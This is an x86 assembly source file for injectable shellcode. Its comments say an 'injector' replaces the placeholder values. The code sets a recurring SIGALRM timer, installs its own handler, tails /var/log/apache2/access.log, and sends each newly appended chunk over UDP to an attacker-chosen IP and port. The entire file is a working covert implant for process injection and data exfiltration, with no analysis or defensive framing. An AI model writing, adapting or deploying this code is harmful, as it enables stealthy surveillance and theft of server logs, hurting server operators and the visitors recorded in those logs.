	.file	"scheduled_setitimer.c"

	.text
.globl setitimer_hdr
	.type	setitimer_hdr, @function

setitimer_hdr:
	pusha
	# sys_setitimer(ITIMER_REAL, *struct_itimerval, NULL)
	xorl    %eax, %eax
	xorl    %ebx, %ebx
	xorl    %edx, %edx
	mov     $104, %al
	jmp     struct_itimerval
load_struct:
	pop	%ecx
	int	$0x80
	popa
	jmp	handler

struct_itimerval:
	call	load_struct
	# these values are replaced by the injector:
	.long   0x0#53434553  # seconds
	.long   0x5343494d  # microseconds
	.long   0x0#53434553  # seconds
	.long   0x5343494d  # microseconds

handler:
	pusha
	# signal(SIGALRM, handler)
	xorl	%eax, %eax
	xorl	%ebx, %ebx
	mov	$48, %al
	mov	$14, %bl
	jmp	handler_end
load_handler:
	pop	%ecx
	subl	$0x19, %ecx # adjust %ecx to point handler()
	int	$0x80
	popa
	jmp	shellcode

handler_end:
	call load_handler

shellcode:
	pusha

	# check if already initialized
	mov     $0x4d454d50, %esi  # replaced by the injector (persistent memory address)
	mov     (%esi), %eax
	cmp     $0xdeadbeef, %eax
	je      open_call          # jump if already initialized

	# initialize
	mov     $0xdeadbeef, %eax
	mov     %eax, (%esi)
	add     $4, %esi
	xorl    %eax, %eax
	mov     %eax, (%esi)
	sub     $4, %esi

open_call:
	# call to sys_open(file_path, O_RDONLY)
	xorl    %eax, %eax
	mov     $5, %al
	jmp     file_path
load_file_path:
	pop     %ebx
	xorl    %ecx, %ecx
	int     $0x80       # %eax = file descriptor
	mov     %eax, %edi  # save file descriptor

check_file_length:
	# call to sys_lseek(fd, 0, SEEK_END)
	mov     %edi, %ebx
	xorl    %eax, %eax
	mov     $19, %al
	xorl    %ecx, %ecx
	xorl    %edx, %edx
	mov     $2, %dl
	int     $0x80  # %eax = end of file offset (eof)

	# get old eof, and store new eof
	add     $4, %esi
	mov     (%esi), %ebx
	mov     %eax, (%esi)

	# skip the first read
	test    %ebx, %ebx
	jz      return_to_main_proc

	# check if file is larger
	# (current end of file > previous end of file)
	cmp     %eax, %ebx
	je      return_to_main_proc # eof not changed: return to main process

calc_data_len:
	# calculate new data length
	# (current eof - last eof)
	mov     %eax, %esi
	sub     %ebx, %esi # saved in %esi

set_new_position:
	# call to sys_lseek(fd, last_eof, SEEK_SET)
	xorl    %eax, %eax
	mov     $19, %al
	mov     %ebx, %ecx
	mov     %edi, %ebx
	xorl    %edx, %edx
	int     $0x80  # %eax = last end of file offset

read_file_tail:
	# allocate buffer
	sub     %esi, %esp

	# call to sys_read(fd, buf, count)
	xorl    %eax, %eax
	mov     $3, %al
	mov     %edi, %ebx
	mov     %esp, %ecx
	mov     %esi, %edx
	int     $0x80       # %eax = bytes read
	mov     %esp, %ebp  # save pointer to buffer

open_socket:
	# call to sys_socketcall($0x01 (socket), *args)
	xorl    %eax, %eax
	mov     $102, %al
	xorl    %ebx, %ebx
	mov     $0x01, %bl
	jmp     socket_args
load_socket_args:
	pop     %ecx
	int     $0x80  # %eax = socket descriptor
	jmp     send_data

socket_args:
	call load_socket_args
	.long	0x02	# AF_INET
	.long	0x02	# SOCK_DGRAM
	.long	0x00	# NULL

send_data:

	# prepare sys_socketcall (sendto) arguments
	jmp     struct_sockaddr
load_sockaddr:
	pop     %ecx
	push    $0x10   # sizeof(struct_sockaddr)
	push    %ecx    # struct_sockaddr address
	xorl    %ecx, %ecx
	push    %ecx    # flags
	push    %edx    # buffer len
	push    %ebp    # buffer pointer
	push    %eax    # socket descriptor

	# call to sys_sendto($11 (sendto), *args)
	xorl    %eax, %eax
	mov     $102, %al
	xorl    %ebx, %ebx
	mov     $11, %bl
	mov     %esp, %ecx
	int     $0x80
	jmp     restore_stack

struct_sockaddr:
	call load_sockaddr
	.short	0x02        # AF_INET
	.short	0x5250      # PORT (replaced by the injector)
	.long	0x34565049  # DEST IP (replaced by the injector)

restore_stack:
	# restore stack
	pop     %ebx    # socket descriptor
	pop     %eax    # buffer pointer
	pop     %edx    # buffer len
	pop     %eax    # flags
	pop     %eax    # struct_sockaddr address
	pop     %eax    # sizeof(struct_sockaddr)

	# deallocate buffer
	add     %edx, %esp


close_socket:
	# call to sys_close(socket)
	xorl    %eax, %eax
	mov     $6, %al
	int     $0x80

return_to_main_proc:

	# call to sys_close(fd)
	xorl    %eax, %eax
	mov     $6, %al
	mov     %edi, %ebx
	int     $0x80

	# return
	popa
	ret

file_path:
	call load_file_path
	.ascii  "/var/log/apache2/access.log"


	.size	setitimer_hdr, .-setitimer_hdr
	.ident	"GCC: (Ubuntu 4.4.3-4ubuntu5) 4.4.3"
	.section	.note.GNU-stack,"",@progbits
